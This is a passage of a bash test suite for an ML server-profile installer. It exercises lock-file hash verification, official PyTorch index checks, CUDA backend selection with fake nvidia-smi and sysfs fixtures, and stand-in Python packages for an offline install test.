        && ok "a profile missing from the archive stops the run before the foundation installs" \
        || bad "missing profile was not refused before bootstrap (exit $pcode)"
else
    ok "profile provision integration skipped without root"
fi

section "ML profile: locks"
# The locks are the contract: every committed one is frozen, hashed, and takes
# torch and torchvision from an official PyTorch index. A backend declared in
# backends.txt without a lock is reported, never offered.
ml_lock_out="$(bash tools/ml-lock.sh --verify 2>&1)" \
    && ok "every committed ml lock verifies" || bad "ml lock verification: $ml_lock_out"
while IFS= read -r pending; do
    skip "${pending#ml-lock: pending: } (lock generation needs https://download.pytorch.org)"
done < <(grep '^ml-lock: pending: ' <<< "$ml_lock_out")
awk '!/^#/ && NF { print $4 }' profiles/ml/backends.txt | grep -Evq '^https://download\.pytorch\.org/whl/[a-z0-9]+$' \
    && bad "a backends.txt index is not an official PyTorch index" \
    || ok "every backends.txt row names an official PyTorch index"
req_names="$(sed 's/#.*//' profiles/ml/requirements.in | awk 'NF { split($1, a, /[=<>!~\[;]/); print tolower(a[1]) }' | LC_ALL=C sort)"
check_names="$(python3 - <<'PY'
import ast
tree = ast.parse(open("profiles/ml/check.py").read())
for node in tree.body:
    if isinstance(node, ast.Assign) and getattr(node.targets[0], "id", "") == "IMPORTS":
        for dist, _ in ast.literal_eval(node.value):
            print(dist)
PY
)"
[[ -n "$req_names" && "$req_names" == "$(LC_ALL=C sort <<< "$check_names")" ]] \
    && ok "ml-doctor imports exactly the packages requirements.in names" \
    || bad "requirements.in and check.py IMPORTS disagree"
grep -qiE '^[[:space:]]*torchtext' profiles/ml/requirements.in \
    && bad "torchtext is in the default ml profile" || ok "torchtext is not part of the default ml profile"
# The language stack every lock must carry; the verifier then holds each lock
# to requirements.in, with a hash for every artifact.
missing_language=""
for package in transformers datasets tokenizers sentencepiece accelerate safetensors huggingface-hub evaluate sacremoses; do
    grep -qx "$package" <<< "$req_names" || missing_language+=" $package"
done
[[ -z "$missing_language" ]] && ok "requirements.in names the whole language stack" \
    || bad "requirements.in does not name:$missing_language"

# Synthetic locks, built here. Their hashes are digests of strings, not of any
# artifact, and never leave this temporary directory.
ML_ARCH="$(case "$(uname -m)" in aarch64|arm64) echo aarch64 ;; *) echo x86_64 ;; esac)"
ML_PINS=(torch=2.14.0 torchvision=0.29.0 numpy=2.3.1 scipy=1.16.0 pandas=2.3.0 scikit-learn=1.7.0
    matplotlib=3.10.3 pillow=11.3.0 opencv-python-headless=4.12.0.88 jupyterlab=4.4.4 ipykernel=6.29.5
    ipywidgets=8.1.7 psutil=7.0.0 transformers=5.17.0 datasets=5.0.1 tokenizers=0.23.2 sentencepiece=0.2.2
    accelerate=1.15.0 safetensors=0.8.0 huggingface-hub=1.33.0 evaluate=0.4.6 sacremoses=0.2.0 spacy=3.8.16
    jupyter-client=8.6.3)
ml_fixture_lock() {  # out, backend, arch, cuda, index, [local version suffix], [extra name=version...]
    local out="$1" backend="$2" arch="$3" cuda="$4" index="$5" suffix="${6-+$2}" pin name version source
    shift 6 || shift $#
    {
        printf '# ml profile lock, generated by tools/ml-lock.sh. Do not edit by hand.\n'
        printf '# backend: %s\n# arch: %s\n# python: 3.12\n# cuda: %s\n# torch-index: %s\n' \
            "$backend" "$arch" "$cuda" "$index"
        printf '%s\n' '--index-url https://pypi.org/simple' ''
        for pin in "${ML_PINS[@]}" "$@"; do
            name="${pin%%=*}"; version="${pin#*=}"; source=https://pypi.org/simple
            if [[ "$name" == torch || "$name" == torchvision ]]; then version="$version$suffix"; source="$index"; fi
            printf '%s==%s \\\n    --hash=sha256:%s\n    # from %s\n' "$name" "$version" \
                "$(printf '%s' "$name$version" | sha256sum | cut -c1-64)" "$source"
        done
    } > "$out"
}
MLV="$TMP/ml-verify"; mkdir -p "$MLV/locks"
cp profiles/ml/requirements.in "$MLV/"
printf '%s\n' 'cpu none x86_64,aarch64 https://download.pytorch.org/whl/cpu' \
    'cu130 13.0 x86_64 https://download.pytorch.org/whl/cu130' \
    'cu126 12.6 x86_64 https://download.pytorch.org/whl/cu130' > "$MLV/backends.txt"
ml_fixture_lock "$MLV/good.txt" cpu x86_64 none https://download.pytorch.org/whl/cpu
ml_verify_fixture() {  # label, expect (pass|fail), fragment, lock name, sed expression
    local label="$1" expect="$2" fragment="$3" name="$4" out code
    rm -f "$MLV/locks/"*
    sed "$5" "$MLV/good.txt" > "$MLV/locks/$name"
    out="$(bash tools/ml-lock.sh --verify --dir "$MLV" 2>&1)"; code=$?
    if [[ "$expect" == pass ]]; then
        [[ "$code" == 0 ]] && ok "ml lock verifier accepts $label" || bad "ml lock verifier rejected $label: $out"
    else
        [[ "$code" != 0 && "$out" == *"$fragment"* ]] && ok "ml lock verifier rejects $label" \
            || bad "ml lock verifier did not reject $label for '$fragment': $out"
    fi
}
ml_verify_fixture "a well-formed lock" pass "" cpu-x86_64.txt ''
ml_verify_fixture "a requirement without a hash" fail "numpy has no SHA-256" cpu-x86_64.txt \
    '/^numpy==/{n;d}'
ml_verify_fixture "a malformed hash" fail "malformed hash" cpu-x86_64.txt \
    '0,/--hash=sha256:/s/--hash=sha256:\([0-9a-f]\{60\}\)[0-9a-f]\{4\}/--hash=sha256:\1/'
ml_verify_fixture "an unpinned requirement" fail "not an exact name==version pin" cpu-x86_64.txt \
    's/^scipy==1.16.0 \\$/scipy>=1.16 \\/'
ml_verify_fixture "an index that is not the official PyTorch one" fail "not an official" cpu-x86_64.txt \
    's#https://download.pytorch.org/whl/cpu#https://mirror.example.com/whl/cpu#g'
ml_verify_fixture "torch taken from PyPI" fail "torch is not taken from" cpu-x86_64.txt \
    '/^torch==/,/# from/s#\# from https://download.pytorch.org/whl/cpu#\# from https://pypi.org/simple#'
ml_verify_fixture "a lock whose header names another backend" fail "do not match the file name" cpu-x86_64.txt \
    's/^# backend: cpu$/# backend: cu130/'
ml_verify_fixture "an undeclared backend" fail "not declared in backends.txt" cu999-x86_64.txt \
    's/^# backend: cpu$/# backend: cu999/'
ml_verify_fixture "an undeclared architecture" fail "does not declare aarch64 for cu130" cu130-aarch64.txt \
    's/^# backend: cpu$/# backend: cu130/; s/^# arch: x86_64$/# arch: aarch64/; s/^# cuda: none$/# cuda: 13.0/; s#/whl/cpu#/whl/cu130#g'
ml_verify_fixture "a lock missing a requirements.in package" fail "requirements.in names psutil, the lock does not pin it" cpu-x86_64.txt \
    '/^psutil==/,/# from/d'
ml_verify_fixture "torch at another version than requirements.in" fail "does not match requirements.in" cpu-x86_64.txt \
    's/^torch==2.14.0+cpu/torch==2.13.0+cpu/'
ml_verify_fixture "torchtext in the default lock" fail "torchtext is excluded" cpu-x86_64.txt \
    '$a torchtext==0.18.0 \\\n    --hash=sha256:'"$(printf 'x' | sha256sum | cut -c1-64)"'\n    # from https://pypi.org/simple'
# The installer routes torch and torchvision with uv's --torch-backend; an index
# line in the lock would send other packages to the PyTorch index's old copies.
ml_verify_fixture "an extra index that would reroute packages at install" fail "option not allowed in a lock" \
    cpu-x86_64.txt 's#^--index-url https://pypi.org/simple$#&\n--extra-index-url https://download.pytorch.org/whl/cpu#'
ml_verify_fixture "a lock that does not name PyPI" fail "does not name PyPI as its index" cpu-x86_64.txt \
    '/^--index-url /d'
ml_verify_fixture "a backend whose index is another backend's" fail "the index uv's --torch-backend cu126 uses" \
    cu126-x86_64.txt 's/^# backend: cpu$/# backend: cu126/; s/^# cuda: none$/# cuda: 12.6/; s#/whl/cpu#/whl/cu130#g'
rm -f "$MLV/locks/"*; cp "$MLV/good.txt" "$MLV/locks/cpu-x86_64.txt"
pending_out="$(bash tools/ml-lock.sh --verify --dir "$MLV" 2>&1)"
[[ $? == 0 && "$pending_out" == *'pending: cpu-aarch64.txt'* && "$pending_out" == *'pending: cu130-x86_64.txt'* ]] \
    && ok "a declared backend without a lock is reported as pending" || bad "pending report: $pending_out"
bash tools/ml-lock.sh --verify --require-all --dir "$MLV" >/dev/null 2>&1 \
    && bad "--require-all accepted a declared backend without a lock" \
    || ok "--require-all fails while a declared backend has no lock"

# Generation, with a stand-in uv that records its arguments and returns a
# canned resolution instead of resolving anything.
MLG="$TMP/ml-generate"; mkdir -p "$MLG/profile" "$MLG/bin"
cp profiles/ml/requirements.in "$MLG/profile/"
printf '%s\n' 'cpu none x86_64 https://download.pytorch.org/whl/cpu' > "$MLG/profile/backends.txt"
ml_fixture_lock "$MLG/good.txt" cpu x86_64 none https://download.pytorch.org/whl/cpu
sed '/^# [a-z-]*: /d; /^# ml profile lock/d' "$MLG/good.txt" > "$MLG/body.txt"
pinned_uv="$(grep -oE 'UV_VERSION="\$\{UV_VERSION:-[^}]+' lib/bootstrap/config.sh | sed 's/.*:-//')"
cat > "$MLG/bin/uv" <<'FAKEUV'
#!/usr/bin/env bash
[[ "$1" == --version ]] && { echo "uv $FAKE_UV_VERSION"; exit 0; }
printf '%s\n' "$@" > "$FAKE_UV_ARGS"
if [[ "$1 $2" == "pip install" ]]; then
    [[ "${FAKE_UV_FAIL:-0}" != 1 ]] || { echo "error: simulated hash mismatch" >&2; exit 1; }
    target=""; lock=""; platform=""
    while (( $# )); do
        case "$1" in --target) target="$2"; shift ;; -r) lock="$2"; shift ;; --python-platform) platform="$2"; shift ;; esac
        shift
    done
    python3 - "$target" "$lock" "${FAKE_WHEEL_PLATFORM:-manylinux_2_28_${platform%%-*}}" "${FAKE_WHEEL_SKIP:-}" <<'PY'
import os, re, sys
target, lock, platform, skip = sys.argv[1:5]
for name, version in re.findall(r"(?m)^([A-Za-z0-9][A-Za-z0-9._-]*)==(\S+)", open(lock).read()):
    if name == skip:
        continue
    info = os.path.join(target, f"{name.replace('-', '_')}-{version}.dist-info")
    os.makedirs(info)
    open(os.path.join(info, "METADATA"), "w").write(f"Name: {name}\nVersion: {version}\n")
    tag = "py3-none-any" if name == "psutil" else f"cp312-cp312-{platform}"
    open(os.path.join(info, "WHEEL"), "w").write(f"Wheel-Version: 1.0\nTag: {tag}\n")
PY
    exit 0
fi
while (( $# )); do [[ "$1" == --output-file ]] && cp "$FAKE_UV_BODY" "$2"; shift; done
FAKEUV
chmod 0755 "$MLG/bin/uv"
ml_generate() { FAKE_UV_VERSION="$1" FAKE_UV_BODY="$2" FAKE_UV_ARGS="$MLG/args" SB_UV="$MLG/bin/uv" \
    bash tools/ml-lock.sh --dir "$MLG/profile" >"$MLG/out" 2>&1; }
if ml_generate "$pinned_uv" "$MLG/body.txt" && [[ -f "$MLG/profile/locks/cpu-x86_64.txt" ]]; then
    ok "ml-lock writes a lock from a resolution that verifies"
    gen_args="$(tr '\n' ' ' < "$MLG/args")"
    gen_missing=0
    for expected in 'pip compile requirements.in' '--python-version 3.12' '--python-platform x86_64-manylinux_2_39' \
        '--torch-backend cpu' '--default-index https://pypi.org/simple' \
        '--generate-hashes' '--emit-index-url' '--emit-index-annotation' '--no-build' '--no-config'; do
        [[ " $gen_args" == *" $expected "* ]] || { bad "ml-lock did not pass '$expected' to uv"; gen_missing=1; }
    done
    [[ " $gen_args" != *" --index "* && " $gen_args" != *" --extra-index-url "* ]] \
        || { bad "ml-lock passed uv an index besides PyPI and the torch backend"; gen_missing=1; }
    (( gen_missing == 0 )) && ok "ml-lock resolves for Python 3.12 with hashes, torch from the official backend index, without builds"
    [[ "$(sed -n '2,6p' "$MLG/profile/locks/cpu-x86_64.txt")" == \
        $'# backend: cpu\n# arch: x86_64\n# python: 3.12\n# cuda: none\n# torch-index: https://download.pytorch.org/whl/cpu' ]] \
        && grep -qx "# resolver: uv $pinned_uv" "$MLG/profile/locks/cpu-x86_64.txt" \
        && ok "a generated lock records its backend, architecture, Python, CUDA, index and resolver" \
        || bad "generated lock header"
else
    bad "ml-lock generation with a verifying resolution: $(cat "$MLG/out")"
fi
rm -rf "$MLG/profile/locks"
ml_generate 0.0.1 "$MLG/body.txt"
[[ $? != 0 && ! -e "$MLG/profile/locks/cpu-x86_64.txt" ]] && grep -q "uv $pinned_uv is pinned" "$MLG/out" \
    && ok "ml-lock refuses a uv other than the pinned one" || bad "ml-lock ran with an unpinned uv"
sed '/^torch==/,/# from/s#\# from https://download.pytorch.org/whl/cpu#\# from https://pypi.org/simple#' \
    "$MLG/body.txt" > "$MLG/pypi-torch.txt"
ml_generate "$pinned_uv" "$MLG/pypi-torch.txt"
[[ $? != 0 && -z "$(ls -A "$MLG/profile/locks" 2>/dev/null)" ]] \
    && ok "ml-lock writes nothing when the resolution takes torch from PyPI" \
    || bad "ml-lock wrote a lock that fails verification"
cp "$MLG/profile/backends.txt" "$MLG/backends.good"
printf '%s\n' 'cpu none x86_64 https://download.pytorch.org/whl/cu130' > "$MLG/profile/backends.txt"
: > "$MLG/args"
ml_generate "$pinned_uv" "$MLG/body.txt"
[[ $? != 0 && ! -s "$MLG/args" && -z "$(ls -A "$MLG/profile/locks" 2>/dev/null)" ]] \
    && grep -q 'cpu must use https://download.pytorch.org/whl/cpu' "$MLG/out" \
    && ok "ml-lock refuses a backends.txt index that is not the backend's own" \
    || bad "ml-lock with a mismatched index: $(cat "$MLG/out")"
cp "$MLG/backends.good" "$MLG/profile/backends.txt"

# --check-artifacts, with the stand-in uv "installing" one wheel record per pin.
mkdir -p "$MLG/profile/locks"; cp "$MLG/good.txt" "$MLG/profile/locks/cpu-x86_64.txt"
ml_artifacts() { env FAKE_UV_VERSION="$pinned_uv" FAKE_UV_ARGS="$MLG/args" SB_UV="$MLG/bin/uv" "$@" \
    bash tools/ml-lock.sh --check-artifacts --dir "$MLG/profile" >"$MLG/out" 2>&1; }
if ml_artifacts; then
    art_args="$(tr '\n' ' ' < "$MLG/args")"
    art_missing=0
    for expected in 'pip install --target' '--python-version 3.12' '--python-platform x86_64-manylinux_2_39' \
        '--torch-backend cpu' '--require-hashes' '--no-deps' '--no-build' '--no-config' '--no-cache'; do
        [[ " $art_args" == *" $expected "* ]] || { bad "--check-artifacts did not pass '$expected' to uv"; art_missing=1; }
    done
    (( art_missing == 0 )) && grep -q "${#ML_PINS[@]} artifacts for x86_64 downloaded, matched their SHA-256" "$MLG/out" \
        && ok "--check-artifacts downloads every pin afresh for the lock's architecture, hashes required" \
        || bad "--check-artifacts report: $(cat "$MLG/out")"
else
    bad "--check-artifacts on a good lock: $(cat "$MLG/out")"
fi
ml_artifacts FAKE_WHEEL_PLATFORM=manylinux_2_28_aarch64
[[ $? != 0 ]] && grep -q 'wheel platform manylinux_2_28_aarch64 is not x86_64' "$MLG/out" \
    && ok "--check-artifacts rejects a wheel built for another architecture" || bad "--check-artifacts arch: $(cat "$MLG/out")"
ml_artifacts FAKE_WHEEL_SKIP=scipy
[[ $? != 0 ]] && grep -q 'scipy: pinned, but no wheel was installed' "$MLG/out" \
    && ok "--check-artifacts rejects a pin that installed no wheel" || bad "--check-artifacts missing wheel: $(cat "$MLG/out")"
ml_artifacts FAKE_UV_FAIL=1
[[ $? != 0 ]] && grep -q 'an artifact is missing for x86_64 or does not match its SHA-256' "$MLG/out" \
    && ok "--check-artifacts fails when a download or hash check fails" || bad "--check-artifacts uv failure: $(cat "$MLG/out")"

section "ML profile: backend selection"
# Every case runs --dry-run through server-profile, the entry point a plan uses,
# against synthetic locks, a stand-in nvidia-smi and an empty or fake /sys.
MLS="$TMP/ml-select"; mkdir -p "$MLS/locks" "$MLS/bin" "$MLS/sys-empty" "$MLS/sys-gpu/bus/pci/devices/0000:01:00.0"
printf '0x10de\n' > "$MLS/sys-gpu/bus/pci/devices/0000:01:00.0/vendor"
printf '0x030200\n' > "$MLS/sys-gpu/bus/pci/devices/0000:01:00.0/class"
ML_PY312="$(command -v python3.12 || { [[ -x /usr/bin/python3.12 ]] && echo /usr/bin/python3.12; } || true)"
printf '#!/bin/sh\necho "uv 0.0.0"\n' > "$MLS/bin/uv"; chmod 0755 "$MLS/bin/uv"
printf '#!/bin/sh\ncase "$*" in *version_info*) echo 3.12.9 ;; *) exit 1 ;; esac\n' > "$MLS/python3.12"
printf '#!/bin/sh\ncase "$*" in *version_info*) echo 3.11.9 ;; *) exit 1 ;; esac\n' > "$MLS/python3.11"
chmod 0755 "$MLS/python3.12" "$MLS/python3.11"
ml_fixture_lock "$MLS/locks/cpu-$ML_ARCH.txt" cpu "$ML_ARCH" none https://download.pytorch.org/whl/cpu
ml_fixture_lock "$MLS/locks/cu126-$ML_ARCH.txt" cu126 "$ML_ARCH" 12.6 https://download.pytorch.org/whl/cu126
ml_fixture_lock "$MLS/locks/cu130-$ML_ARCH.txt" cu130 "$ML_ARCH" 13.0 https://download.pytorch.org/whl/cu130
fake_smi() {  # directory, CUDA version (or "broken")
    mkdir -p "$1"
    if [[ "$2" == broken ]]; then
        printf '#!/bin/sh\necho "NVIDIA-SMI has failed because it could not communicate with the NVIDIA driver." >&2\nexit 9\n' > "$1/nvidia-smi"
    else
        printf '#!/bin/sh\nif [ "$1" = -L ]; then echo "GPU 0: Fake GPU (UUID: GPU-0)"; exit 0; fi\n' > "$1/nvidia-smi"
        printf 'echo "| NVIDIA-SMI 999.99   Driver Version: 999.99   CUDA Version: %s |"\n' "$2" >> "$1/nvidia-smi"
    fi
    chmod 0755 "$1/nvidia-smi"
}
fake_smi "$MLS/smi-13.0" 13.0; fake_smi "$MLS/smi-12.8" 12.8; fake_smi "$MLS/smi-12.4" 12.4; fake_smi "$MLS/smi-broken" broken
ml_select() {  # label, expect (backend name or "fail"), fragment, env assignments..., -- args
    local label="$1" expect="$2" fragment="$3" out code
    local -a assignments=()
    shift 3
    while (( $# )) && [[ "$1" != -- ]]; do assignments+=("$1"); shift; done
    shift
    out="$(env PATH="$MLS/bin:/usr/bin:/bin" WORKSPACE_ROOT="$MLS/ws" ML_LOCK_DIR="$MLS/locks" \
        ML_SYSFS_ROOT="$MLS/sys-empty" ML_NVIDIA_SMI="$MLS/absent/nvidia-smi" ML_PYTHON="$MLS/python3.12" ML_UV="$MLS/bin/uv" ML_MIN_FREE_GB=0 \
        "${assignments[@]}" ./server-profile install ml --dry-run "$@" 2>&1)"; code=$?
    if [[ "$expect" == fail ]]; then
        [[ "$code" != 0 && "$out" == *"$fragment"* && "$out" != *'plan: '* ]] \
            && ok "backend selection: $label" || bad "backend selection: $label (exit $code): $out"
    else
        [[ "$code" == 0 && "$out" == *"plan: install backend $expect from $expect-$ML_ARCH.txt"* \
            && "$out" == *"$fragment"* ]] \
            && ok "backend selection: $label" || bad "backend selection: $label (exit $code): $out"
    fi
}
ml_select "no GPU selects cpu" cpu 'auto: no NVIDIA GPU detected' -- --backend auto
ml_select "auto is the default" cpu 'auto: no NVIDIA GPU detected' --
ml_select "a CUDA 13.0 driver selects the newest locked CUDA backend" cu130 'CUDA 13.0' \
    ML_NVIDIA_SMI="$MLS/smi-13.0/nvidia-smi" -- --backend auto
ml_select "a CUDA 12.8 driver selects the newest backend it supports" cu126 'CUDA 12.8' \
    ML_NVIDIA_SMI="$MLS/smi-12.8/nvidia-smi" --
ml_select "a driver too old for every CUDA lock fails instead of choosing CPU" fail \
    'does not fall back to CPU' ML_NVIDIA_SMI="$MLS/smi-12.4/nvidia-smi" --
ml_select "NVIDIA hardware without nvidia-smi fails instead of choosing CPU" fail \
    'does not fall back to CPU' ML_SYSFS_ROOT="$MLS/sys-gpu" --
ml_select "a failing nvidia-smi fails instead of choosing CPU" fail 'does not fall back to CPU' \
    ML_NVIDIA_SMI="$MLS/smi-broken/nvidia-smi" --
ml_select "cpu by name on an NVIDIA host proceeds with a warning" cpu 'WARN  backend: the CPU backend was requested' \
    ML_NVIDIA_SMI="$MLS/smi-13.0/nvidia-smi" -- --backend cpu
ml_select "a CUDA backend newer than the driver fails" fail 'needs CUDA 13.0, but the driver supports CUDA 12.8' \
    ML_NVIDIA_SMI="$MLS/smi-12.8/nvidia-smi" -- --backend cu130
ml_select "a CUDA backend by name without a GPU proceeds with a warning" cu130 'GPU checks will be skipped' \
    -- --backend cu130
ml_select "a backend without a lock fails and names the locked ones" fail \
    "backend 'cu999' has no lock for $ML_ARCH; locked backends for $ML_ARCH: cpu cu126 cu130" -- --backend cu999
ml_select "a backend name that is a path fails" fail 'invalid backend name' -- --backend ../cpu
ml_select "a Python other than 3.12 fails preflight" fail 'is not a Python 3.12 interpreter' \
    ML_PYTHON="$MLS/python3.11" --
ml_select "a missing uv fails preflight" fail 'uv: not found' ML_UV="$MLS/absent/uv" --
ml_select "too little disk space fails preflight" fail 'needs 999999' ML_MIN_FREE_GB=999999 --
mkdir -p "$MLS/only-cuda"; cp "$MLS/locks/cu130-$ML_ARCH.txt" "$MLS/only-cuda/"
ml_select "no GPU and no CPU lock fails" fail "backend 'cpu' has no lock" ML_LOCK_DIR="$MLS/only-cuda" --
mkdir -p "$MLS/only-cpu"; cp "$MLS/locks/cpu-$ML_ARCH.txt" "$MLS/only-cpu/"
ml_select "an NVIDIA host with only a CPU lock fails instead of choosing CPU" fail 'locked backends for' \
    ML_LOCK_DIR="$MLS/only-cpu" ML_NVIDIA_SMI="$MLS/smi-13.0/nvidia-smi" --
[[ ! -e "$MLS/ws" ]] && ok "no dry run or failed selection created a workspace, state or environment" \
    || bad "backend selection left files behind"
mkdir -p "$MLS/ws/venvs/ml-workbench"
ml_select "an ml-workbench directory the profile did not create is refused" fail 'was not created by this profile' --
rm -rf "$MLS/ws"
# A directory the run cannot write stops it before anything is built. Root
# writes everywhere, so as root the case runs as nobody, like the dry-run test.
mkdir -p "$MLS/ro-ws" "$MLS/ro-bin"; chmod 0777 "$MLS/ro-ws"; chmod 0555 "$MLS/ro-bin"
ro_run=(env PATH="$MLS/bin:/usr/bin:/bin" WORKSPACE_ROOT="$MLS/ro-ws" ML_LOCK_DIR="$MLS/locks" \
    ML_SYSFS_ROOT="$MLS/sys-empty" ML_NVIDIA_SMI="$MLS/absent/nvidia-smi" ML_PYTHON="$MLS/python3.12" \
    ML_UV="$MLS/bin/uv" ML_MIN_FREE_GB=0 ML_BIN_DIR="$MLS/ro-bin" ./server-profile install ml)
if (( EUID != 0 )); then
    ro_out="$("${ro_run[@]}" 2>&1)"; ro_code=$?
elif command -v setpriv >/dev/null 2>&1; then
    chmod a+rx "$TMP"; chmod -R a+rX "$MLS"
    ro_out="$(setpriv --reuid=65534 --regid=65534 --clear-groups "${ro_run[@]}" 2>&1)"; ro_code=$?
fi
if [[ -n "${ro_code:-}" ]]; then
    [[ "$ro_code" != 0 && "$ro_out" == *"cannot write $MLS/ro-bin"* && -z "$(ls -A "$MLS/ro-ws")" ]] \
        && ok "an unwritable command directory stops the run before anything is built" \
        || bad "unwritable command directory (exit $ro_code): $ro_out"
else
    skip "unwritable command directory (root without setpriv)"
fi
if [[ -z "$(bash -c 'source profiles/ml/lib.sh; ML_LOCK_DIR="$1"; ml_load_config; ml_locked_backends x86_64; ml_locked_backends aarch64' _ "$MLS/absent")" ]]; then
    ok "without a lock, no backend is offered"
else
    bad "a missing lock directory reports locked backends"
fi

section "ML profile: install, repeat, reconfigure and rollback"
# A stand-in uv builds "environments" whose packages are small modules written
# from the lock, run by the real Python 3.12 with its site directory disabled,
# so nothing on the host leaks in and nothing is downloaded.
MLI="$TMP/ml-install"; mkdir -p "$MLI/bin" "$MLI/locks" "$MLI/templates/torch" \
    "$MLI/templates/torchvision/transforms" "$MLI/templates/jupyter_client"
if [[ -z "$ML_PY312" ]]; then
    skip "ml install lifecycle and commands (no python3.12 on this host)"
else
cat > "$MLI/templates/torch/__init__.py" <<'PY'
# Stand-in torch: only the API profiles/ml/check.py calls.
import os
float32, uint8 = "float32", "uint8"


class _Version:
    cuda = os.environ.get("FAKE_TORCH_BUILD_CUDA") or None


version = _Version()


class Tensor:
    def __init__(self, data, shape):
        self._data, self.shape = list(data), tuple(shape)

    def reshape(self, *shape):
        return Tensor(self._data, shape)

    def to(self, device):
        return self

    def cpu(self):
        return self

    @property
    def T(self):
        rows, cols = self.shape
        return Tensor([self._data[i * cols + j] for j in range(cols) for i in range(rows)], (cols, rows))

    def __matmul__(self, other):
        rows, inner = self.shape
        cols = other.shape[1]
        return Tensor([float(sum(self._data[i * inner + t] * other._data[t * cols + j] for t in range(inner)))
                       for i in range(rows) for j in range(cols)], (rows, cols))

    def tolist(self):
        def build(data, shape):
            if len(shape) == 1:
                return list(data)
            step = len(data) // shape[0]
            return [build(data[i * step:(i + 1) * step], shape[1:]) for i in range(shape[0])]
        return build(self._data, self.shape)


def arange(n, dtype=None):
    return Tensor([float(i) if dtype == float32 else i for i in range(n)], (n,))


def empty(n, dtype=None, device=None):
    return Tensor([], (n,))


def device(kind, index=None):
    return (kind, index)


def manual_seed(seed):
    return None


def tensor(rows):
    return Tensor([value for row in rows for value in row], (len(rows), len(rows[0])))


def allclose(first, second):
    return first.shape == second.shape and first._data == second._data


class no_grad:
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class cuda:
    @staticmethod
    def is_available():
        return int(os.environ.get("FAKE_TORCH_CUDA_DEVICES", "0")) > 0

    @staticmethod
    def device_count():
        return int(os.environ.get("FAKE_TORCH_CUDA_DEVICES", "0"))

    @staticmethod
    def get_arch_list():
        return os.environ.get("FAKE_TORCH_ARCH_LIST", "sm_80,sm_90").split(",")

    @staticmethod
    def get_device_capability(index):
        major, minor = os.environ.get("FAKE_TORCH_CAPABILITY", "8.6").split(".")
        return int(major), int(minor)

    @staticmethod
    def get_device_name(index):
        return "Fake GPU"

    @staticmethod
    def synchronize(device=None):
        return None
PY
cat > "$MLI/templates/torchvision/transforms/functional.py" <<'PY'
import torch


def hflip(image):
    channels, height, width = image.shape
    data = image._data
    return torch.Tensor([data[c * height * width + h * width + (width - 1 - w)]
                         for c in range(channels) for h in range(height) for w in range(width)], image.shape)
PY
: > "$MLI/templates/torchvision/transforms/__init__.py"
cat > "$MLI/templates/jupyter_client/kernelspec.py" <<'PY'
class KernelSpecManager:
    def find_kernel_specs(self):
        return {"python3": "/fake/share/jupyter/kernels/python3"}
PY
# Stand-ins for the language stack: just the calls check.py makes, working on
# the files and strings it passes them.
mkdir -p "$MLI/templates/tokenizers" "$MLI/templates/transformers" "$MLI/templates/sentencepiece" \
    "$MLI/templates/sacremoses" "$MLI/templates/datasets" "$MLI/templates/spacy" "$MLI/templates/huggingface_hub"
cat > "$MLI/templates/tokenizers/__init__.py" <<'PY'
import json
from . import models, pre_tokenizers, trainers


class Tokenizer:
    def __init__(self, model):
        self.model, self.pre_tokenizer, self.vocab = model, None, {}

    def train_from_iterator(self, lines, trainer):
        self.vocab = {token: index for index, token in enumerate(trainer.special_tokens)}
        for line in lines:
            for word in line.split():
                self.vocab.setdefault(word, len(self.vocab))

    def save(self, path):
        with open(path, "w") as handle:
            json.dump({"vocab": self.vocab}, handle)
PY
printf 'class WordLevel:\n    def __init__(self, unk_token=None):\n        self.unk_token = unk_token\n' \
    > "$MLI/templates/tokenizers/models.py"
printf 'class Whitespace:\n    pass\n' > "$MLI/templates/tokenizers/pre_tokenizers.py"
printf 'class WordLevelTrainer:\n    def __init__(self, special_tokens=()):\n        self.special_tokens = list(special_tokens)\n' \
    > "$MLI/templates/tokenizers/trainers.py"
cat > "$MLI/templates/transformers/__init__.py" <<'PY'
import json
import os

import torch


class PreTrainedTokenizerFast:
    def __init__(self, tokenizer_file, unk_token="[UNK]", pad_token=None):
        with open(tokenizer_file) as handle:
            self.vocab = json.load(handle)["vocab"]
        self.unk_token_id = self.vocab[unk_token]
        self.words = {index: word for word, index in self.vocab.items()}

    def encode(self, text, add_special_tokens=True):
        return [self.vocab.get(word, self.unk_token_id) for word in text.split()]

    def decode(self, ids):
        return " ".join(self.words[index] for index in ids)


class BertConfig:
    def __init__(self, **values):
        self.hidden_size, self.num_hidden_layers = 768, 12
        self.__dict__.update(values)

    def save_pretrained(self, path):
        os.makedirs(path, exist_ok=True)
        with open(os.path.join(path, "config.json"), "w") as handle:
            json.dump(self.__dict__, handle)


class AutoConfig:
    @staticmethod
    def from_pretrained(path, local_files_only=False):
        assert local_files_only, "the checks must never reach the Hub"
        with open(os.path.join(path, "config.json")) as handle:
            return BertConfig(**json.load(handle))


class _Output:
    def __init__(self, hidden):
        self.last_hidden_state = hidden


class BertModel:
    def __init__(self, config):
        self.config = config

    def eval(self):
        return self

    def __call__(self, input_ids):
        tokens, width = input_ids.shape[1], self.config.hidden_size
        return _Output(torch.Tensor([0.5] * (tokens * width), (1, tokens, width)))

    def save_pretrained(self, path):
        self.config.save_pretrained(path)
        with open(os.path.join(path, "model.safetensors"), "wb") as handle:
            handle.write(b"stand-in weights")


class AutoModel:
    @staticmethod
    def from_pretrained(path, local_files_only=False):
        return BertModel(AutoConfig.from_pretrained(path, local_files_only=local_files_only))
PY
cat > "$MLI/templates/sentencepiece/__init__.py" <<'PY'
import json


class SentencePieceTrainer:
    @staticmethod
    def train(sentence_iterator, model_writer, **options):
        model_writer.write(json.dumps(sorted({w for line in sentence_iterator for w in line.split()})).encode())


class SentencePieceProcessor:
    def __init__(self, model_proto):
        self.pieces = json.loads(model_proto)

    def encode(self, text):
        return [self.pieces.index(word) for word in text.split()]

    def decode(self, ids):
        return " ".join(self.pieces[index] for index in ids)

    def get_piece_size(self):
        return len(self.pieces)
PY
cat > "$MLI/templates/sacremoses/__init__.py" <<'PY'
import re


class MosesTokenizer:
    def __init__(self, lang):
        self.lang = lang

    def tokenize(self, text):
        return re.findall(r"\w+|[^\w\s]", text)
PY
cat > "$MLI/templates/datasets/__init__.py" <<'PY'
class Dataset:
    def __init__(self, columns):
        self._columns = columns

    @classmethod
    def from_dict(cls, columns):
        return cls({name: list(values) for name, values in columns.items()})

    def map(self, function):
        rows = [dict(zip(self._columns, values)) for values in zip(*self._columns.values())]
        added = [function(row) for row in rows]
        columns = dict(self._columns)
        for name in added[0]:
            columns[name] = [row[name] for row in added]
        return Dataset(columns)

    def __getitem__(self, name):
        return self._columns[name]
PY
